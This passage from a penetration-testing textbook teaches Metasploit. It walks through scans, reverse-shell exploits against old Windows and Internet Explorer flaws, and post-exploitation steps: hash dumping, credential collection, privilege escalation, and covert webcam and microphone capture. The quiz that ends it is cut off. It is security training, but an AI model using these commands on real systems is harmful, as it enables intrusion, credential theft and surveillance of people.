- pgno: 321
  md: '# FTP Server


    If you want to find FTP servers, even if they are not anonymous, the commands
    are quite similar, as you might expect:


    ```

    ```

    use auxiliary/scanner/ftp/ftp_version

    set RHOSTS 172.20.0.1

    show options

    run

    ```

    ```


    Figure 13-14 shows the results.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_321_0.png)


    FIGURE 13-14 FTP Scan.


    Obviously, there are many other scans you can do. These should be a good start
    for you understanding Metasploit. I suggest you perform these scans first against
    machines that you know what the results should be. Try the FTP scanner on a machine
    you know has an FTP server, then try it on one that know does not. Examine the
    show options each time. Get comfortable with the scans before moving on to the
    exploits. The scans themselves are a powerful tool for gaining information about
    a target.


    # How to Use Exploits


    Using exploits is not that different from using scans. You will see the syntax
    of the commands is quite similar. Now keep in mind that an exploit only works
    if the target has that specific vulnerability. If it does not, then the exploit
    will not work. If you want a guarantee that these will work, use a target of Windows
    7 without service pack 1. Then most of these will work easily.'
  merge: -1
  img_proc: true
- pgno: 322
  md: '# Exploit Examples


    As you learned previously in this chapter, you can search either online or in
    Metasploit for a number of exploits. I will show you just a few here as samples.


    # Cascading Style Sheets


    This attack is based on a flaw in how Internet Explorer running on Windows 7 handles
    and processes cascading style sheets. This attack has two parts. The first is
    done on the Kali machine:


    ```

    use exploit/windows/browser/ms11_003_ie_css_import

    set payload windows/meterpreter/reverse_tcp

    set URIPATH /clickhere

    set LHOST 10.0.2.20

    exploit

    ```


    Some of this looks just like the scans. You start with the **use** statement,
    just like scans. But then you have a second command, to set the payload. Basically,
    that means you are using a specific exploit, then setting the payload you wish
    to deliver to the target. The **URIPATH** will give a path after the IP address.
    Which brings us to the **LHOST**, which is short for listening host. The IP address
    is the IP address of your Kali machine. Then type **exploit**. Figure 13-15 shows
    this scan in action.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_322_0.png)


    FIGURE 13-15 CSS Exploit.


    At this point, your Kali machine is a web server waiting for someone to connect
    to it. Now on the target machine, open Internet Explorer and navigate to http://10.0.2.20:8080/clickhere.'
  merge: -1
  img_proc: true
- pgno: 323
  md: 'If that target machine has the vulnerability, you will see a stream of activity
    on your Kali machine. It will look much like what you see in Figure 13-16.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_323_0.png)


    FIGURE 13-16 CSS Attack Underway.


    After the stream of messages on the screen stops, type:


    ```

    sessions -l

    ```


    That will list current sessions. If you see any numbers, then you got a session.
    If not, the attack failed. If you got one, then try sessions -i 3 (replace 3 with
    the number of your session) as demonstrated in Figure 13-17.


    Now that you have a session, what can you do? Well, later in this chapter we will
    discuss a wide range of post exploits you can do, but for now, let us just verify
    that you did get a connection. Type:


    ```

    sysinfo

    ```


    You will get system information for the client that connected to you. Then type:


    ```

    getuid

    ```


    You will get user and machine name for the client. Figure 13-18 shows the results
    of the sysinfo and getuid commands.'
  merge: -1
  img_proc: true
- pgno: 324
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_324_0.png)


    FIGURE 13-17 Sessions.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_324_1.png)


    FIGURE 13-18 On the Target Computer.


    Note that for these examples, I named the target computer “target-PC”. If you
    really want to verify you have control of the client, type:


    ```

    shell

    ```


    You will now have a Windows shell on that Windows 7 computer. You can tell because
    it is a Windows-style command prompt. You can navigate on the client as shown
    in Figure 13-19.


    When you are done, type exit to get back to the Metasploit meterpreter command
    prompt. If you want to get back to the main Metasploit prompt, type exit again.
    But be careful, because if you type it a third time you will exit Metasploit.
    We will examine more things you can do post exploit later in this chapter. First,
    let us look at a few other exploits.'
  merge: -1
  img_proc: true
- pgno: 325
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_325_0.png)


    FIGURE 13-19 Navigating on the Target Computer.


    # File Format Exploit


    This exploit is similar to the previous exploit, with a few differences. Because
    we examined the last exploit so thoroughly, here we will just discuss the differences.


    ```

    use exploit/windows/fileformat/ms15_100_mcl_exe

    set payload windows/meterpreter/reverse_tcp

    set lhost YOURKALI IP

    set lport 443

    set srvhost yourIP

    set srvport differentport

    exploit

    ```


    So, you will set a listening host and listening port. The server host will be
    the same as the listening host, but the server port will be different, as shown
    in Figure 13-20.


    This one is a little different. The target machine does not open a browser; instead
    they type into start> run the ip and path. In this case:


    ```

    \\10.0.2.20\hyzgu\msf.exe

    ```


    Now you may be wondering, how do you get an end user to click on a link, or type
    something at the start> run menu? This is where social engineering comes in. As
    mentioned in the previous chapter, many attacks are, ultimately, social engineering.
    Also note that after each exploit you may have left some service running. Always
    run jobs to see if any are still running, then kill that job before moving to
    the next exploit.'
  merge: -1
  img_proc: true
- pgno: 326
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_326_0.png)


    FIGURE 13-20  File Format Exploit.


    # Remote Desktop Exploit


    This one is a bit of a scan, rather than directly exploiting. But it is checking
    if the target has a specific remote desktop flaw that would let you get into that
    machine with remote desktop:


    ```

    use auxiliary/scanner/rdp/ms12_020_check

    set RHOSTS YOURTARGETIP

    set RPORT 3389

    set THREADS 1

    ```


    You can see the results in Figure 13-21.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_326_1.png)


    FIGURE 13-21  RDP Exploit.'
  merge: -1
  img_proc: true
- pgno: 327
  md: '# More Exploits


    Obviously, there are thousands of possible exploits. The goal of this chapter
    is to introduce you to Metasploit, not to have you master it. But in this section,
    we will briefly look at a few others. I will give less detail on these. If you
    have really studied the preceding exploits, then the mechanics of these should
    be fairly obvious to you.


    # Windows XP DCOM Attack


    This exploit attacks a flaw in Windows XP that involved how Windows XP dealt with
    the Distributed Component Object Model (DCOM). You will notice that this exploit
    does not require the user to click anything. It just tried to brute force its
    way into the machine. As always, replace the IP addresses with the ones you have
    set up:


    ```

    use exploit/windows/dcerpc/ms03_026_dcom

    set RHOST 192.168.1.177

    set PAYLOAD generic/shell_reverse_tcp

    set LHOST 192.168.1.234

    exploit

    ```


    # Icon DLL Loader


    This exploit does require the target machine to navigate to a specific IP address.
    It, of course, will only work if the target machine has the specific vulnerability:


    ```

    use exploit/windows/browser/ms10_046_shortcut_icon_dllloader.

    set payload windows/meterpreter/reverse_tcp

    set SRVHOST YOURKALIIP

    set LHOST YOURKALIIP

    exploit

    ```


    # Common Error


    The most common error you will see is that:


    ```

    exploit completed, but no session was created

    ```


    The “no session was created” message occurs if one of the following happens:


    +   - The exploit you used doesn’t work against the target you selected. The issue
    could be that the exploit is for a different version, there is a problem with
    the exploit code, or there is a problem with the target configuration.

    +   - The exploit you used was configured to use a payload that doesn’t create
    an interactive session. In this case, the framework has no way of knowing whether
    the exploit worked, because it doesn’t receive a connection from the target when
    it is successful.'
  merge: -1
  img_proc: true
- pgno: 328
  md: '# Post Exploits


    Once you get in with any of the previous attacks, you will want to do something
    on that machine. We have looked at a few simple things you can try, but now let
    us look at a few others. These are all executed from the meterpreter shell after
    you have a session on the target.


    # Get Logged-on Users


    This is simple, and will tell you who is logged on to the target machine:


    ```

    run post/windows/gather/enum_logged_on_users

    ```


    You can see the results in Figure 13-22.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_328_0.png)


    FIGURE 13-22 Logged-on Users.


    # Check VM


    Virtual machines can be used for many purposes. But one common use is as a honey
    pot. So if you get into a machine, you might want to know if it is a VM. Just
    use this:


    ```

    run post/windows/gather/checkvm

    ```


    You can see the results in Figure 13-23.'
  merge: -1
  img_proc: true
- pgno: 329
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_329_0.png)


    FIGURE 13-23 Check VM.


    # Enumerate Applications


    It is probably worth noting what applications are on the target machine. This
    exploit will do that for you:


    ```

    run post/windows/gather/enum_applications

    ```


    You can see the results in Figure 13-24.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_329_1.png)


    FIGURE 13-24 Enumerating Applications.


    # Going Deeper into the Target


    If you are able to exploit a target, and run post exploits, you may wish to go
    a bit further on the target. Start by finding out what running processes there
    are on that machine, by using ps at the meterpreter prompt as demonstrated in
    Figure 13-25.


    Now you can attempt to migrate to any process with:


    ```

    migrate processid

    ```


    Replace processid with the actual process ID of the target process. This may work,
    or it may fail. If it fails, you can try to get elevated privileges with these
    commands:


    ```

    use priv

    getsystem

    ```'
  merge: -1
  img_proc: true
- pgno: 330
  md: '![](img/fa54c6d61c14db5421f8f63e6d594bb5_330_0.png)


    # FIGURE 13-25 Discovering Running Processes with run ps.


    But these are not guaranteed to work. By this point in this book you should realize
    that nothing is really guaranteed. You may also want to try and spy on the target
    machine with Metasploit:


    ```

    webcam_list

    ```


    Then pick the camera and type:


    ```

    webcam_snap

    ```


    If you get tired of taking pictures with the target machine’s webcam, then use
    the microphone to record:


    ```

    record_mic

    ```


    The record_mic is shown in Figure 13-26.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_330_1.png)


    # FIGURE 13-26 Recording with the Microphone Using record_mic.


    The webcam_snap is one I frequently use in real penetration tests. This causes
    absolutely no harm to the target machine, and will illustrate the need for better
    security. In fact, many people find it unnerving when your penetration testing
    report includes a picture of them at their desk. Usually, after they get over
    the initial uneasiness, they take security much more seriously after that.'
  merge: -1
  img_proc: true
- pgno: 331
  md: 'There are also several other post exploits you can try. Of course, nothing
    is guaranteed to work, but you may want to try these:


    +   - **run post/windows/gather/usb_history:** This will get all USB devices that
    have been connected to the machine.

    +   - **run post/windows/gather/hashdump:** This will dump the hashes of the Windows
    passwords. You can then run those through rainbow tables.

    +   - **run post/multi/recon/local_exploit_suggester:** This one is rather obvious.

    +   - **use post/windows/gather/enum_patches:** Find out what patches are on this
    machine. That will let you know what else might work, and what won’t.

    +   - **run post/windows/gather/credentials/credential_collector:** This will
    attempt to grab local credentials.'
  merge: -1
  img_proc: true
- pgno: 332
  md: "# Summary\n\nThis chapter covered the essentials of Metasploit. After completing\
    \ this chapter, as well as the projects at the end, you will have a working knowledge\
    \ of Metasploit. Obviously, a single chapter won’t make you an expert with Metasploit.\
    \ In fact, entire books have been written on Metasploit, and none of them cover\
    \ everything. But if you take the time to carefully study the material in this\
    \ chapter, and really master it, you will have a strong working knowledge. There\
    \ are plenty of resources on the web to help you learn specific exploits and techniques.\
    \ Our goal is to get you a basic working knowledge.\n\n# Test Your Skills\n\n\
    # MULTIPLE CHOICE QUESTIONS\n\n+   1. The current version of Metasploit was written\
    \ in what language?\n+      A. Python\n+      B. Perl\n+      C. Ruby\n+     \
